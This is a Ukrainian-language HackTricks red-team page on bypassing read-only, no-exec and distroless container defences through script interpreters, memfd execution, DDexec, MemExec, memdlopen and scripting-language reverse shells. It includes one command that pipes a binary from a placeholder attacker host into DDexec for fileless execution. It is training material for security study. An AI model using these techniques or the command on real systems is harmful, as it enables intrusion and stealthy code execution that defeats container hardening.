# Обхід захистів FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Відео

У наступних відео наведені на цій сторінці техніки пояснюються детальніше:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## сценарій read-only / no-exec

Дедалі частіше трапляються linux-машини, змонтовані із захистом файлової системи **read-only (ro)**, особливо в контейнерах. Це пояснюється тим, що запустити контейнер із файловою системою ro так само просто, як встановити **`readOnlyRootFilesystem: true`** у `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Однак навіть якщо файлова система змонтована як ro, **`/dev/shm`** усе одно буде доступною для запису, тож твердження, що ми не можемо нічого записати на диск, є хибним. Водночас ця папка буде **змонтована із захистом no-exec**, тому якщо ви завантажите сюди binary, **ви не зможете його виконати**.

> [!WARNING]
> З perspective red team це **ускладнює завантаження та виконання** binary, яких ще немає в системі (наприклад, backdoors або enumerators на кшталт `kubectl`).

## Найпростіший обхід: скрипти

Зверніть увагу, що я згадував саме binary: ви можете **виконати будь-який скрипт**, якщо його interpreter є на машині, наприклад **shell script**, якщо присутній `sh`, або **python** **script**, якщо встановлено **python**.

Однак цього недостатньо, щоб виконати ваш binary backdoor або інші binary tools, які вам можуть знадобитися.

## Обхід через memory

Якщо ви хочете виконати binary, але файлова система цього не дозволяє, найкращий спосіб — **виконати його з memory**, оскільки **захист не поширюється на memory**.

### Обхід через FD + exec syscall

Якщо на машині є потужні scripting engines, такі як **Python**, **Perl** або **Ruby**, ви можете завантажити binary для виконання з memory, зберегти його в memory file descriptor (`create_memfd` syscall), на який ці захисти не поширюються, а потім викликати **`exec` syscall**, вказавши **fd як файл для виконання**.

Для цього можна легко скористатися проєктом [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви передаєте йому binary, і він згенерує скрипт в указаній мові з **binary, стисненим і закодованим у b64**, та інструкціями для його **декодування й розпакування** у **fd**, створений викликом `create_memfd` syscall, а також викликом **exec** syscall для його запуску.

> [!WARNING]
> Це не працює в інших scripting languages, таких як PHP або Node, оскільки вони не мають **стандартного способу викликати raw syscalls** зі скрипту, тому неможливо викликати `create_memfd` для створення **memory fd**, у якому зберігатиметься binary.
>
> Крім того, створення **звичайного fd** із файлом у `/dev/shm` не спрацює, оскільки вам не дозволять його запустити: діятиме **захист no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) — це техніка, яка дає змогу **змінювати memory власного процесу**, перезаписуючи його **`/proc/self/mem`**.

Отже, **контролюючи assembly code**, який виконується процесом, ви можете записати **shellcode** і «мутувати» процес, щоб **виконати будь-який довільний код**.

> [!TIP]
> **DDexec / EverythingExec** дає змогу завантажувати та **виконувати** власний **shellcode** або **будь-який binary** з **memory**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Для отримання додаткової інформації про цю техніку перегляньте GitHub або:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) — це природний наступний крок після DDexec. Це **DDexec shellcode, запущений як daemon**, тому щоразу, коли потрібно **запустити інший binary**, не потрібно повторно запускати DDexec: можна просто виконати memexec shellcode через техніку DDexec, а потім **взаємодіяти з цим daemon, щоб передавати нові binaries для завантаження та запуску**.

Приклад використання **memexec для виконання binaries із PHP reverse shell** можна знайти в [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Подібно до DDexec, техніка [**memdlopen**](https://github.com/arget13/memdlopen) забезпечує **простіший спосіб завантаження binaries** у пам’ять для подальшого виконання. Вона також може дозволити завантажувати binaries із dependencies.

## Distroless Bypass

Щоб отримати спеціальне пояснення **того, чим насправді є distroless**, коли він допомагає, коли ні та як він змінює post-exploitation підхід у контейнерах, перегляньте:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Що таке distroless

Distroless-контейнери містять лише **мінімально необхідні компоненти для запуску конкретного застосунку або сервісу**, наприклад libraries і runtime dependencies, але не містять більших компонентів, таких як package manager, shell або системні utilities.

Мета distroless-контейнерів — **зменшити attack surface контейнерів шляхом усунення непотрібних компонентів** і мінімізації кількості вразливостей, які можна експлуатувати.

### Reverse Shell

У distroless-контейнері ви можете **взагалі не знайти `sh` або `bash`**, щоб отримати звичайний shell. Також там не буде таких binaries, як `ls`, `whoami`, `id`... усього, що ви зазвичай запускаєте в системі.

> [!WARNING]
> Тому ви **не зможете отримати **reverse shell** або виконати **enumerate** системи так, як зазвичай.

Однак якщо скомпрометований контейнер, наприклад, запускає Flask web application, то Python встановлений, а отже, ви можете отримати **Python reverse shell**. Якщо він запускає Node, можна отримати Node rev shell; те саме стосується майже будь-якої **scripting language**.

> [!TIP]
> Використовуючи scripting language, ви можете **виконати enumerate системи** за допомогою можливостей цієї мови.

Якщо **protections `read-only/no-exec` відсутні**, ви можете використати свій reverse shell, щоб **записати binaries у file system** і **виконати** їх.

> [!TIP]
> Однак у таких контейнерах ці protections зазвичай існують, але для їх обходу можна використати **попередні memory execution techniques**.

Приклади того, як **експлуатувати деякі RCE-вразливості**, щоб отримати **reverse shells на scripting languages** і виконувати binaries із пам’яті, можна знайти в [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
